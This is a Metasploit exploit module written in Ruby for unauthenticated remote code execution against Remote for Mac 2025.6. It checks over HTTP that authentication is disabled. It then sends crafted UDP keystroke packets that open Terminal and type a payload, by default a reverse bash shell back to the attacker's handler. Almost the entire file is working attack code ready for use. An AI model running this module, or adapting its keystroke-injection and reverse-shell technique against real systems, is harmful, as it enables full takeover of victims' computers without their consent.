 
require 'msf/core'
require 'json'
require 'socket'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Remote for Mac 2025.6 UDP Keyboard Input Remote Code Execution',
      'Description'    => %q{
        This module exploits an unauthenticated remote code execution vulnerability
        in Remote for Mac 2025.6. By sending crafted UDP packets simulating keyboard
        input, an attacker can execute arbitrary commands when "Allow unknown devices"
        is enabled.
      },
      'Author'         => ['Chokri Hammedi'],
      'License'        => MSF_LICENSE,
      'References'     => [['URL', 'https://packetstorm.news/files/id/196351/']],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Remote for Mac 2025.6', {}]],
      'DefaultTarget'  => 0,
      'DefaultPayload' => 'cmd/unix/reverse_bash',
      'DisclosureDate' => '2025-05-27'))

    register_options(
      [
        Opt::RHOSTS(),
        Opt::RPORT(49229),
        OptBool.new('SSL', [true, 'Use SSL for HTTP check', true]),
        OptString.new('TARGETURI', [true, 'Base URI path', '/']),
      ]
    )
  end

  def check_auth_disabled?
    protocol = datastore['SSL'] ? 'https' : 'http'
    vprint_status("Checking if authentication is disabled on #{protocol}://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}api/getVersion")

    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(datastore['TARGETURI'], 'api', 'getVersion'),
        'ctype'  => 'application/json',
        'ssl'    => datastore['SSL'],
        'rport'  => datastore['RPORT'],
        'rhost'  => datastore['RHOSTS']
      })

      if res && res.code == 200
        json = JSON.parse(res.body)
        if json['requires.auth'] == false
          print_good("Authentication is disabled. Target is vulnerable.")
          return true
        else
          print_error("Target requires authentication. Exploit aborted.")
          return false
        end
      else
        print_error("Failed to get a valid response from target")
        return false
      end
    rescue ::Rex::ConnectionError, JSON::ParserError => e
      print_error("Connection or parsing error: #{e.message}")
      return false
    end
  end

def exploit
  unless check_auth_disabled?
    fail_with(Failure::NotVulnerable, 'Target requires authentication or is unreachable')
  end

  udp_port = datastore['RPORT']
  target_ip = datastore['RHOSTS']

  initial_packets_hex = [
    "07000200370001",
    "07000200370001",
    "060003002000",
    "07000200370000",
    "07000200370000"
  ]

  final_packets_hex = [
    "07000200240001",
    "07000200240000"
  ]

  udp_sock = UDPSocket.new
  udp_sock.connect(target_ip, udp_port)

  print_status("Simulating user input...")
  initial_packets_hex.each do |hexpkt|
    udp_sock.send([hexpkt].pack('H*'), 0)
    select(nil, nil, nil, 0.05)
  end

  prefix = [0x06, 0x00, 0x03, 0x00].pack('C*')
  word = "terminal"
  print_status("Launching terminal...")
  word.each_char do |ch|
    pkt = prefix + ch.encode('utf-16le').force_encoding('ASCII-8BIT')
    udp_sock.send(pkt, 0)
    select(nil, nil, nil, 0.1)
  end

  final_packets_hex.each do |hexpkt|
    udp_sock.send([hexpkt].pack('H*'), 0)
    select(nil, nil, nil, 0.1)
  end

  sleep(2)

  shell_cmd = payload.encoded
  print_status("Delivering payload...")
  shell_cmd.each_char do |ch|
    pkt = prefix + ch.encode('utf-16le').force_encoding('ASCII-8BIT')
    udp_sock.send(pkt, 0)
    select(nil, nil, nil, 0.1)
  end

  print_status("Executing payload...")
  final_packets_hex.each do |hexpkt|
    udp_sock.send([hexpkt].pack('H*'), 0)
    select(nil, nil, nil, 0.1)
  end

  print_good("Payload sent successfully. Check your handler for a session.")
ensure
  udp_sock.close if udp_sock
end


end
